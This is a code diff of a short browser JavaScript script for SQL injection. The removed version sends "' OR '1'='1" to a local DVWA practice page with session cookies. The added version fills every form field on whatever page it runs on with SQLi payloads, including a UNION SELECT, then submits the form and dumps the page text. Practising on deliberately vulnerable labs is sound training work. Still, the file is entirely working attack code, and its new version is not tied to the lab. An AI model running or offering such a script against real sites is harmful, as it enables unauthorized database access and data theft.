@@ -1,31 +1,27 @@
-(async function() {
-  console.log("Starting manual SQL injection...");
+(function () {
+  console.log("SQL Injection script running...");
 
-  const sqlPayload = "' OR '1'='1";  // classic SQLi
+  const sqlPayloads = [
+    "' OR 1=1 --",
+    "' UNION SELECT NULL, NULL --",
+    "' OR 'a'='a"
+  ];
 
-  // Build the URL manually
-  const targetUrl = "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=" + encodeURIComponent(sqlPayload) + "&Submit=Submit";
+  const formInputs = document.querySelectorAll('input, textarea');
 
-  try {
-    const response = await fetch(targetUrl, {
-      method: 'GET',
-      credentials: 'include'  // needed to send cookies/session
-    });
+  formInputs.forEach(input => {
+    input.value = sqlPayloads[0]; // Insert the payload
+    console.log(`Injected payload into input: ${input.name || input.id || 'unnamed input'}`);
+  });
 
-    const html = await response.text();
-    console.log("Response received:");
-    console.log(html);
-
-    // Optional: parse and extract only the interesting parts
-    const parser = new DOMParser();
-    const doc = parser.parseFromString(html, 'text/html');
-    const result = doc.querySelector('pre, .vulnerable_code_area, #main_body'); // tweak as needed
-    if (result) {
-      console.log("Extracted result:", result.textContent);
-    } else {
-      console.log("Could not find specific result element.");
-    }
-  } catch (error) {
-    console.error("Fetch failed:", error);
+  const form = document.querySelector('form');
+  if (form) {
+    form.submit(); // Submit the form
   }
+
+  // When the page reloads, log the visible text content
+  window.addEventListener('load', () => {
+    console.log("Page reloaded. Extracting visible text...");
+    console.log(document.body.innerText); // Log full page text
+  });
 })();
